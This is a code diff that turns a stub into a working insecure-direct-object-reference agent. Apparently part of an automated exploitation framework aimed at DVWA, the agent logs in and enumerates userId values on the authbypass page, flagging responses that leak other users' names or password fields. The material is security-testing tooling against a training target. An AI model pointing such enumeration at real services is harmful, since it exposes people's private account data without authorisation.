@@ -1,4 +1,4 @@
-"""Access Control IDOR agent."""
+"""Access Control IDOR agent with real HTTP execution."""
 
 from __future__ import annotations
 
@@ -6,107 +6,221 @@ import logging
 from typing import Any
 
 from agents.agent_telemetry import exploit_event, probe_event, score_event
-from agents.state_utils import make_update, normalize_security_level
-from core.state import ExploitationState
-from foundation.payload_library import PayloadLibrary
+from agents.state_utils import already_tried_payloads, candidate_payloads_for_stage, chain_check as _chain_check, make_update, normalize_security_level
+from core.state import ExploitationState, MODULE_TO_KG_NODE
+from foundation.session_manager import DVWASession
+from foundation.verifier import Verifier
 
 logger = logging.getLogger(__name__)
 
 AGENT_ID = "ac_idor"
+MODULE_PATH = "/vulnerabilities/authbypass/"
 _PROBE_OBSERVATION_KEY = "object_ids_enumerable"
-_CHAIN_OUTCOME = "data_exfiltrated"
 
-_DEFAULT_PROBE = ["id=1", "id=2"]
-_DEFAULT_EXPLOIT = ["id=3", "id=4"]
-_DEFAULT_BYPASS = {
-    "medium": ["horizontal_increment"],
-    "high": ["sparse_id_scan"],
-}
+# Signals indicating the response contains user-specific data
+_DATA_SIGNALS = [
+    "admin", "gordonb", "pablo", "smithy",
+    "first name", "surname", "user id",
+    "password",
+]
 
+
+def _probe_preconditions(
+    session: DVWASession, payloads: list[str], already_tried: set[str]
+) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
+    """Enumerate predictable object IDs to detect IDOR.
+
+    Returns (precondition_met, tried_payloads, observations, telemetry_events).
+    """
+    observations: dict[str, bool] = {}
+    tried: list[str] = []
+    events: list[dict] = []
+    verifier = Verifier()
+
+    # Get baseline response for user ID 1 (the admin user)
+    baseline_text = ""
+    baseline_len = 0
+    try:
+        baseline_resp = session.get(MODULE_PATH, params={"userId": "1", "Submit": "Submit"})
+        baseline_text = baseline_resp.text
+        baseline_len = len(baseline_text)
+    except Exception as exc:
+        logger.warning("[%s] PROBE baseline request failed: %s", AGENT_ID, exc)
+        # Baseline failed — still attempt probes and compare them against each other
+        baseline_text = ""
+
+    sent_any = False
+    responses: list[tuple[str, str, int]] = []  # (payload, text, length)
+    for payload in payloads:
+        if payload in already_tried:
+            continue
+        sent_any = True
+        try:
+            test_id = payload.strip()
+            if test_id == "1":
+                continue
+            tried.append(payload)
+            resp = session.get(MODULE_PATH, params={"userId": test_id, "Submit": "Submit"})
+            events.append(probe_event(AGENT_ID, f"userId={test_id}", resp.status_code, True))
+            if resp.status_code == 200:
+                responses.append((test_id, resp.text, len(resp.text)))
+                resp_signals = verifier.contains_any(resp.text, _DATA_SIGNALS)
+                # IDOR detected if different user data is returned
+                if baseline_text:
+                    if resp_signals.ok and len(resp.text) != baseline_len:
+                        observations[_PROBE_OBSERVATION_KEY] = True
+                        return True, tried, observations, events
+                    if resp.text != baseline_text and len(resp.text) > 100:
+                        observations[_PROBE_OBSERVATION_KEY] = True
+                        return True, tried, observations, events
+                else:
+                    # No baseline — compare against other responses
+                    if len(responses) >= 2:
+                        first_text = responses[0][1]
+                        if resp.text != first_text and resp_signals.ok:
+                            observations[_PROBE_OBSERVATION_KEY] = True
+                            return True, tried, observations, events
+        except Exception as exc:
+            logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
+            events.append(probe_event(AGENT_ID, f"userId={payload}", None, False))
+
+    if not sent_any:
+        return False, tried, {}, events
+    observations[_PROBE_OBSERVATION_KEY] = False
+    return False, tried, observations, events
+
+
+def _attempt_exploit(
+    session: DVWASession, payloads: list[str], already_tried: set[str]
+) -> tuple[int, list[str], list[str], list[dict]]:
+    """Confirm unauthorized data access. Returns (score, tried, confirmed_vulns, events)."""
+    tried: list[str] = []
+    events: list[dict] = []
+    confirmed: list[str] = []
+    score = 0
+    verifier = Verifier()
+
+    # Fetch baseline for differential comparison
+    baseline_text = ""
+    try:
+        baseline_resp = session.get(MODULE_PATH, params={"userId": "1", "Submit": "Submit"})
+        baseline_text = baseline_resp.text
+    except Exception as exc:
+        logger.warning("[%s] EXPLOIT baseline request failed: %s", AGENT_ID, exc)
+
+    for payload in payloads:
+        if payload in already_tried:
+            continue
+        tried.append(payload)
+        try:
+            test_id = payload.strip()
+            resp = session.get(MODULE_PATH, params={"userId": test_id, "Submit": "Submit"})
+            events.append(exploit_event(AGENT_ID, f"userId={test_id}", resp.status_code, True))
+            if resp.status_code == 200:
+                result = verifier.contains_any(resp.text, _DATA_SIGNALS)
+                # Require response to differ from baseline to confirm IDOR
+                if result.ok and resp.text != baseline_text:
+                    score = max(score, 3)
+                    confirmed.append(MODULE_TO_KG_NODE[AGENT_ID])
+                    break
+        except Exception as exc:
+            logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
+            events.append(exploit_event(AGENT_ID, f"userId={payload}", None, False))
+
+    return score, tried, confirmed, events
 
 def ac_idor_agent(state: ExploitationState) -> dict[str, Any]:
-    """Run PROBE -> EXPLOIT -> CHAIN CHECK for ac_idor."""
+    """Execute the IDOR static method agent for access-control testing.
+
+    Reads validated object-id candidates, discovered endpoints, session
+    configuration, existing observations, and tried payload memory. The agent
+    probes object-id enumerability, attempts unauthorized object access over
+    HTTP, confirms `ac_idor_confirmed` on access evidence, and runs shared
+    chain scoring when the method succeeds.
+
+    Args:
+        state: Current shared LangGraph state.
+
+    Returns:
+        Partial state update for observations, tried payloads, scores,
+        confirmed vulnerabilities, achieved outcomes, and telemetry events.
+    """
     target_url = state.get("target_url", "")
     security_level = normalize_security_level(state.get("security_level"))
 
     if not target_url:
-        update = make_update(
-            state=state,
-            module_name=AGENT_ID,
-            score=0,
-            tried_payloads=[],
+        return make_update(state=state, module_name=AGENT_ID, score=0, tried_payloads=[])
+
+    session = DVWASession(target_url)
+    try:
+        if not session.login():
+            return make_update(
+                state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
+                failure_agents=[AGENT_ID],
+            )
+        session.set_security_level(security_level)
+
+        already_tried = already_tried_payloads(state, AGENT_ID)
+        confirmed_vulns: list[str] = []
+        achieved_outcomes: list[str] = []
+        score = 0
+        telemetry_events: list[dict[str, Any]] = []
+        all_tried: list[str] = []
+        observations: dict[str, bool] = {}
+
+        # Stage 1: PROBE
+        probe_payloads = candidate_payloads_for_stage(state, AGENT_ID, security_level, "probe") or ["2", "3", "4"]
+        probe_ok, tried, probe_obs, probe_events = _probe_preconditions(
+            session, probe_payloads, already_tried
         )
-        return update
+        all_tried.extend(tried)
+        telemetry_events.extend(probe_events)
+        observations.update(probe_obs)
 
-    payload_lib = PayloadLibrary()
-    payload_set = payload_lib.get(AGENT_ID, security_level)
+        if not probe_ok:
+            update = make_update(
+                state=state, module_name=AGENT_ID, score=0,
+                tried_payloads=all_tried, telemetry_events=telemetry_events,
+            )
+            update["observations"] = observations
+            return update
 
-    probe_payloads = list(payload_set.probe) or _DEFAULT_PROBE
-    exploit_payloads = list(payload_set.exploit) or _DEFAULT_EXPLOIT
-    bypass_payloads = list(payload_set.bypass.get(security_level, [])) or _DEFAULT_BYPASS.get(security_level, [])
-    all_exploit = exploit_payloads + bypass_payloads
-
-    already_tried = list(state.get("tried_payloads", {}).get(AGENT_ID, []))
-    temp_state: dict[str, Any] = {"tried_payloads": dict(state.get("tried_payloads", {}))}
-
-    observations: dict[str, bool] = dict(state.get("observations", {}))
-    confirmed_vulns: list[str] = []
-    achieved_outcomes: list[str] = []
-    score = 0
-    telemetry_events: list[dict[str, Any]] = []
-
-    # PROBE stage
-    probe_triggered = False
-    for payload in probe_payloads:
-        if payload in already_tried:
-            continue
-        temp_state.update(PayloadLibrary.record_tried(temp_state, AGENT_ID, payload))
-        telemetry_events.append(probe_event(AGENT_ID, payload, None, True))
-        logger.info("[%s] PROBE payload: %s", AGENT_ID, payload)
-        probe_triggered = True
-
-    if probe_triggered:
-        observations[_PROBE_OBSERVATION_KEY] = True
         score = max(score, 1)
 
-    # EXPLOIT stage
-    exploit_triggered = False
-    for payload in all_exploit:
-        if payload in already_tried:
-            continue
-        temp_state.update(PayloadLibrary.record_tried(temp_state, AGENT_ID, payload))
-        telemetry_events.append(exploit_event(AGENT_ID, payload, None, True))
-        logger.info("[%s] EXPLOIT payload: %s", AGENT_ID, payload)
-        exploit_triggered = True
-        break
+        # Stage 2: EXPLOIT
+        all_exploit = candidate_payloads_for_stage(state, AGENT_ID, security_level, "exploit") or ["5", "6"]
 
-    if exploit_triggered:
-        if security_level == "low" or bypass_payloads:
-            score = max(score, 3)
-            confirmed_node = f"{AGENT_ID}_confirmed"
-            if confirmed_node not in confirmed_vulns:
-                confirmed_vulns.append(confirmed_node)
-        else:
-            score = max(score, 2)
+        exploit_score, tried, confirmed, exploit_events = _attempt_exploit(
+            session, all_exploit, already_tried | set(all_tried)
+        )
+        all_tried.extend(tried)
+        telemetry_events.extend(exploit_events)
+        score = max(score, exploit_score)
+        confirmed_vulns.extend(confirmed)
 
-    # CHAIN CHECK stage
-    if score >= 3:
-        if _CHAIN_OUTCOME not in achieved_outcomes:
-            achieved_outcomes.append(_CHAIN_OUTCOME)
-        score = 4
+        # Stage 3: CHAIN CHECK
+        if confirmed_vulns:
+            chain_score, chain_achieved = _chain_check(confirmed_vulns[0], state)
+            if chain_score >= 4:
+                score = max(score, chain_score)
+                achieved_outcomes.extend(chain_achieved)
 
-    tried_now = list(temp_state["tried_payloads"].get(AGENT_ID, []))
+        telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))
 
-    telemetry_events.append(score_event(AGENT_ID, score, confirmed_vulns, achieved_outcomes))
-
-    update = make_update(
-        state=state,
-        module_name=AGENT_ID,
-        score=score,
-        tried_payloads=tried_now,
-        confirmed_vulns=confirmed_vulns or None,
-        achieved_outcomes=achieved_outcomes or None,
-        telemetry_events=telemetry_events,
-    )
-    update["observations"] = observations
-    return update
+        update = make_update(
+            state=state, module_name=AGENT_ID, score=score,
+            tried_payloads=all_tried,
+            confirmed_vulns=confirmed_vulns or None,
+            achieved_outcomes=achieved_outcomes or None,
+            telemetry_events=telemetry_events,
+        )
+        update["observations"] = observations
+        return update
+    except Exception as exc:
+        logger.warning("[%s] Session or execution failed: %s", AGENT_ID, exc)
+        return make_update(
+            state=state, module_name=AGENT_ID, score=0, tried_payloads=[],
+            failure_agents=[AGENT_ID],
+        )
+    finally:
+        session.close()
